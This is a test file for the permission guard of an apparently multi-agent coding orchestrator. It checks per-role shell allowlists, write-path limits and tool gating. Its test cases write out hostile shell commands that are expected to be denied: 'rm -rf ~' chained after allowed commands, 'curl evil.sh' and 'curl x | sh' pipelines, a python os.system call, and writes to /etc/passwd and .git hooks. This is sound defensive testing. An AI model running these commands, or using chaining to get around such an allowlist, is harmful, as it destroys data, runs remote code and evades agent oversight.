import { describe, expect, it } from "vitest";
import { resolve } from "node:path";
import {
  checkBashCommand,
  checkWritePath,
  evaluateToolUse,
  findShellOperator,
  stripCdPrefix,
  type GuardContext,
} from "../src/sdk/permissions.js";
import { roles } from "../src/roles/index.js";
import { bashAllowListFor } from "../src/roles/common.js";
import type { RunRecord } from "../src/orchestrator/types.js";
import type { StackId } from "../src/stacks.js";

const repo = resolve("/work/app");
const other = resolve("/work/api");
const runDir = resolve("/orch/runs/RUN-1");

function record(stacks: StackId[], approvedSuite = false): RunRecord {
  return {
    repos: [{ path: repo, baseBranch: "main", aiGuidelinePath: null, stacks }],
    stateHistory: approvedSuite ? [{ at: "", from: "awaiting_test_suite_approval", to: "e2e_tester_running" }] : [],
  } as unknown as RunRecord;
}

function bashOk(role: keyof typeof roles, cmd: string, stacks: StackId[] = ["typescript"], approvedSuite = false): boolean {
  return checkBashCommand(cmd, bashAllowListFor(roles[role], record(stacks, approvedSuite)), [repo, other]).allow;
}

describe("findShellOperator", () => {
  it.each([
    ["git status; rm -rf ~", ";"],
    ["git status && rm -rf ~", "&&"],
    ["git status || true", "||"],
    ["npm test | tee out", "|"],
    ["npm test > out.txt", ">"],
    ["npm test < in", "<"],
    ["npm test &", "&"],
    ["git log $(whoami)", "$("],
    ["git log `whoami`", "`"],
    ['git commit -m "$(whoami)"', "$("],
    ['git commit -m "x', 'unbalanced "'],
  ])("%s → %s", (cmd, op) => {
    expect(findShellOperator(cmd)).toBe(op);
  });

  it("ignores operators inside quotes", () => {
    expect(findShellOperator('git commit -m "fix: a; b && c | d"')).toBeNull();
    expect(findShellOperator("git commit -m 'uses $(x) and `y`'")).toBeNull();
    expect(findShellOperator("npm test -- -t 'a > b'")).toBeNull();
  });

  it("treats escaped characters as literal", () => {
    expect(findShellOperator(String.raw`git log --grep=a\;b`)).toBeNull();
  });
});

describe("stripCdPrefix", () => {
  it("strips cd into a run repo", () => {
    expect(stripCdPrefix(`cd ${repo} && git status`, [repo])).toBe("git status");
    expect(stripCdPrefix(`cd "${repo}/" && git status`, [repo])).toBe("git status");
  });
  it("keeps cd into anything else", () => {
    expect(stripCdPrefix("cd /etc && ls", [repo])).toBe("cd /etc && ls");
  });
});

describe("checkBashCommand", () => {
  it("allows plain allowlisted commands", () => {
    expect(bashOk("developer", "git status")).toBe(true);
    expect(bashOk("developer", 'git commit -m "feat: add x; and y"')).toBe(true);
    expect(bashOk("developer", "npm test")).toBe(true);
    expect(bashOk("developer", "npm run test:unit -- --run")).toBe(true);
    expect(bashOk("developer", "npx vitest run src/foo.test.ts")).toBe(true);
    expect(bashOk("developer", "npm test 2>&1")).toBe(true);
    expect(bashOk("developer", `cd ${other} && npm test`)).toBe(true);
  });

  it("rejects chaining after an allowed prefix (the old bypass)", () => {
    expect(bashOk("developer", "git status; rm -rf ~")).toBe(false);
    expect(bashOk("developer", "git status && curl evil.sh")).toBe(false);
    expect(bashOk("developer", "ls | sh")).toBe(false);
    expect(bashOk("developer", `cd ${repo} && git status && rm -rf .`)).toBe(false);
    expect(bashOk("developer", "npm test\nrm -rf ~")).toBe(false);
  });

  it("rejects cd into a directory outside the run", () => {
    expect(bashOk("developer", "cd /etc && ls")).toBe(false);
  });

  it("rejects arguments that write files or run programs", () => {
    expect(bashOk("developer", "git diff --output=/tmp/x")).toBe(false);
    expect(bashOk("developer", "git log --output /tmp/x")).toBe(false);
  });

  it("keeps branch control with the orchestrator", () => {
    expect(bashOk("developer", "git branch --show-current")).toBe(true);
    expect(bashOk("developer", "git branch -D main")).toBe(false);
    expect(bashOk("developer", "git checkout main")).toBe(false);
    expect(bashOk("developer", "git checkout -b other")).toBe(false);
    expect(bashOk("developer", "git checkout -- src/a.ts")).toBe(true);
    expect(bashOk("developer", "git push origin HEAD")).toBe(false);
  });

  it("does not let long-running dev servers run", () => {
    expect(bashOk("developer", "npm run dev")).toBe(false);
  });

  it("keeps the Reviewer read-only", () => {
    expect(bashOk("reviewer", "git diff master...HEAD")).toBe(true);
    expect(bashOk("reviewer", "npm run lint")).toBe(true);
    expect(bashOk("reviewer", "git commit -m x")).toBe(false);
    expect(bashOk("reviewer", "npm test")).toBe(false);
  });

  it("only lets the PR Creator push a named branch to origin", () => {
    expect(bashOk("prCreator", "git push -u origin feature/proj-1-x")).toBe(true);
    expect(bashOk("prCreator", "git push --force origin feature/x")).toBe(false);
    expect(bashOk("prCreator", "git push origin --delete main")).toBe(false);
    expect(bashOk("prCreator", "gh pr create --fill")).toBe(false);
  });

  it("does not allow installs for the E2E tester until suite creation is approved", () => {
    expect(bashOk("e2eTester", "npm install -D @playwright/test")).toBe(false);
    expect(bashOk("e2eTester", "npx playwright test")).toBe(true);
    expect(bashOk("e2eTester", "npm install -D @playwright/test", ["typescript"], true)).toBe(true);
    expect(bashOk("developer", "npm install left-pad", ["typescript"], true)).toBe(false);
    // Downloading browsers is an install too.
    expect(bashOk("e2eTester", "npx playwright install chromium")).toBe(false);
    expect(bashOk("e2eTester", "npx playwright install chromium", ["typescript"], true)).toBe(true);
  });

  it("allows test runners for the unit and integration testers", () => {
    for (const role of ["unitTester", "integrationTester"] as const) {
      expect(bashOk(role, "npx vitest run")).toBe(true);
      expect(bashOk(role, "npm run test:integration")).toBe(true);
      expect(bashOk(role, "git push origin x")).toBe(false);
    }
  });
});

describe("stack profiles", () => {
  it("Vue and React get the Node toolchain plus their type checkers", () => {
    expect(bashOk("unitTester", "npx vue-tsc --noEmit", ["vue"])).toBe(true);
    expect(bashOk("unitTester", "npx vitest run src/components", ["react"])).toBe(true);
    expect(bashOk("unitTester", "yarn test", ["react"])).toBe(true);
    expect(bashOk("unitTester", "node --test", ["node"])).toBe(true);
  });

  it(".NET: dotnet test/build/format, vulnerable-package audit for the Reviewer", () => {
    expect(bashOk("unitTester", "dotnet test --filter Category=Unit", ["dotnet"])).toBe(true);
    expect(bashOk("developer", "dotnet build", ["dotnet"])).toBe(true);
    expect(bashOk("reviewer", "dotnet format --verify-no-changes", ["dotnet"])).toBe(true);
    expect(bashOk("reviewer", "dotnet list package --vulnerable", ["dotnet"])).toBe(true);
    expect(bashOk("reviewer", "dotnet test", ["dotnet"])).toBe(false);
    expect(bashOk("developer", "dotnet add package Foo", ["dotnet"])).toBe(false);
    expect(bashOk("e2eTester", "pwsh bin/Debug/net8.0/playwright.ps1 install", ["dotnet"], true)).toBe(true);
    expect(bashOk("e2eTester", "pwsh bin/Debug/net8.0/playwright.ps1 install", ["dotnet"])).toBe(false);
  });

  it("Python: pytest via the venv, python -m, uv/poetry run; linters for the Reviewer", () => {
    for (const cmd of ["pytest -q", ".venv/bin/pytest tests/unit", "python -m pytest -k export", "uv run pytest", "poetry run python -m pytest"]) {
      expect(bashOk("unitTester", cmd, ["python"]), cmd).toBe(true);
    }
    expect(bashOk("reviewer", "ruff check .", ["python"])).toBe(true);
    expect(bashOk("reviewer", "mypy src", ["python"])).toBe(true);
    expect(bashOk("reviewer", "pip-audit", ["python"])).toBe(true);
    expect(bashOk("unitTester", "python -c 'import os; os.system(\"id\")'", ["python"])).toBe(false);
    expect(bashOk("unitTester", "pip install requests", ["python"])).toBe(false);
    expect(bashOk("e2eTester", "python -m playwright install", ["python"], true)).toBe(true);
  });

  it("Go: go test/vet/build, gofmt -l, golangci-lint, govulncheck", () => {
    expect(bashOk("unitTester", "go test ./... -run TestExport", ["go"])).toBe(true);
    expect(bashOk("developer", "go build ./...", ["go"])).toBe(true);
    expect(bashOk("reviewer", "golangci-lint run", ["go"])).toBe(true);
    expect(bashOk("reviewer", "govulncheck ./...", ["go"])).toBe(true);
    expect(bashOk("unitTester", "go run ./cmd/server", ["go"])).toBe(false);
    expect(bashOk("developer", "go get github.com/x/y", ["go"])).toBe(false);
  });

  it("a stack's commands are not available in a repo of another stack", () => {
    expect(bashOk("unitTester", "go test ./...", ["typescript"])).toBe(false);
    expect(bashOk("unitTester", "npm test", ["python"])).toBe(false);
    expect(bashOk("unitTester", "dotnet test", ["go"])).toBe(false);
  });

  it("a multi-stack repo gets the union", () => {
    expect(bashOk("unitTester", "go test ./...", ["go", "typescript"])).toBe(true);
    expect(bashOk("unitTester", "npm test", ["go", "typescript"])).toBe(true);
  });

  it("chaining is still rejected whatever the stack", () => {
    expect(bashOk("unitTester", "pytest; rm -rf ~", ["python"])).toBe(false);
    expect(bashOk("unitTester", "dotnet test && curl x | sh", ["dotnet"])).toBe(false);
  });
});

describe("checkWritePath", () => {
  it("allows writes inside a root", () => {
    expect(checkWritePath(`${repo}/src/a.ts`, [repo], "/").allow).toBe(true);
    expect(checkWritePath("src/a.ts", [repo], repo).allow).toBe(true);
  });
  it("rejects writes outside every root, including traversal", () => {
    expect(checkWritePath("/etc/passwd", [repo], repo).allow).toBe(false);
    expect(checkWritePath("../api/src/a.ts", [repo], repo).allow).toBe(false);
    expect(checkWritePath(`${repo}-evil/a.ts`, [repo], repo).allow).toBe(false);
  });
  it("rejects writes inside .git", () => {
    expect(checkWritePath(`${repo}/.git/hooks/pre-commit`, [repo], repo).allow).toBe(false);
  });
  it("rejects a missing path", () => {
    expect(checkWritePath(undefined, [repo], repo).allow).toBe(false);
  });
});

describe("evaluateToolUse", () => {
  const ctx: GuardContext = {
    allowedTools: ["Read", "Write", "Bash"],
    bashAllowList: [/^git\s+status$/],
    repoPaths: [repo],
    writeRoots: [runDir],
    cwd: repo,
  };
  it("denies tools that are not on the role's list", () => {
    expect(evaluateToolUse("WebFetch", {}, ctx).allow).toBe(false);
    expect(evaluateToolUse("Edit", { file_path: `${runDir}/x.md` }, ctx).allow).toBe(false);
  });
  it("applies write scope", () => {
    expect(evaluateToolUse("Write", { file_path: `${runDir}/report.md` }, ctx).allow).toBe(true);
    expect(evaluateToolUse("Write", { file_path: `${repo}/src/a.ts` }, ctx).allow).toBe(false);
  });
  it("applies the Bash allowlist", () => {
    expect(evaluateToolUse("Bash", { command: "git status" }, ctx).allow).toBe(true);
    expect(evaluateToolUse("Bash", { command: "git status; id" }, ctx).allow).toBe(false);
  });
  it("allows ungated tools on the list", () => {
    expect(evaluateToolUse("Read", { file_path: "/etc/hosts" }, ctx).allow).toBe(true);
  });
});
